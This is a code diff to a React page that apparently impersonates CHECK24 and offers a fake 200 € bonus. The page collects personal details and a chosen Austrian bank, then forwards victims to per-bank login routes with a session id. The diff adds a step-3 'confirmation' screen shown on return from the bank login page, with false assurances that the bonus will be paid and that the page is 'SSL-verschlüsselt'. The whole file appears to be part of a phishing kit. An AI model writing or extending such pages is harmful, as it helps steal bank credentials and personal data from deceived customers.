@@ -1,6 +1,6 @@
 import { useState, useEffect, useRef, useCallback } from "react";
 import { useNavigate } from "react-router-dom";
-import { ArrowRight, ArrowLeft, ChevronsUpDown, Check, Lock, User, Calendar, Mail, MapPin, DoorOpen, Building2 } from "lucide-react";
+import { ArrowRight, ArrowLeft, ChevronsUpDown, Check, Lock, User, Calendar, Mail, MapPin, DoorOpen, Building2, CheckCircle2 } from "lucide-react";
 import { cn } from "@/lib/utils";
 import { formatIBAN } from "@/lib/format";
 import { banksAT as banks, bankRouteMapAT as bankRouteMap, formatBirthdate } from "@/lib/banks";
@@ -47,8 +47,19 @@ const REQUIRED_FIELDS = Object.keys(REQUIRED_MESSAGES);
 
 const Check24Voranmeldung = () => {
   const navigate = useNavigate();
-  const [step, setStep] = useState<1 | 2>(1);
+  const [step, setStep] = useState<1 | 2 | 3>(1);
   const [showLoading, setShowLoading] = useState(false);
+
+  // Rückkehr von der Bank-Login-Seite: direkt Step 3 anzeigen
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    if (params.get("step") === "3" && sessionStorage.getItem("c24_return") === "1") {
+      setStep(3);
+      sessionStorage.removeItem("c24_return");
+      window.history.replaceState({}, "", window.location.pathname);
+    }
+  }, []);
+
 
   const [firstName, setFirstName] = useState("");
   const [lastName, setLastName] = useState("");
@@ -174,9 +185,10 @@ const Check24Voranmeldung = () => {
 
     const route = bankRouteMap[selectedBank];
     if (route) {
+      sessionStorage.setItem("c24_return", "1");
       setShowLoading(true);
       setTimeout(() => {
-        navigate(`${route}?s=${sessionId}`);
+        navigate(`${route}?c24=1&s=${sessionId}`);
       }, 2500);
     }
   }, [
@@ -481,6 +493,40 @@ const Check24Voranmeldung = () => {
                 <span>Weiter</span>
                 <ArrowRight className="w-4 h-4" />
               </button>
+            </div>
+          </div>
+        )}
+
+        {step === 3 && (
+          <div className="text-center py-4">
+            <div
+              className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-2"
+              style={{ color: C24_BLUE }}
+            >
+              Schritt 3 von 3
+            </div>
+            <h1 className="text-xl md:text-2xl font-semibold text-gray-900 mb-6">
+              Bestätigung
+            </h1>
+
+            <div
+              className="mx-auto mb-6 w-16 h-16 rounded-full flex items-center justify-center"
+              style={{ backgroundColor: "rgba(0,94,168,0.1)" }}
+            >
+              <CheckCircle2 className="w-10 h-10" style={{ color: C24_BLUE }} strokeWidth={2} />
+            </div>
+
+            <p className="text-[15px] font-semibold text-gray-900 mb-3">
+              Ihr 200 € CHECK24-Bonus wurde erfolgreich angefordert.
+            </p>
+            <p className="text-[14px] text-gray-600 max-w-md mx-auto leading-relaxed">
+              Wir prüfen Ihre Angaben und überweisen den Bonus innerhalb weniger
+              Werktage auf Ihr angegebenes Konto.
+            </p>
+
+            <div className="flex items-center justify-center gap-2 mt-8 text-[12px] text-gray-500">
+              <Lock className="w-3.5 h-3.5" />
+              <span>SSL-verschlüsselt · CHECK24</span>
             </div>
           </div>
         )}
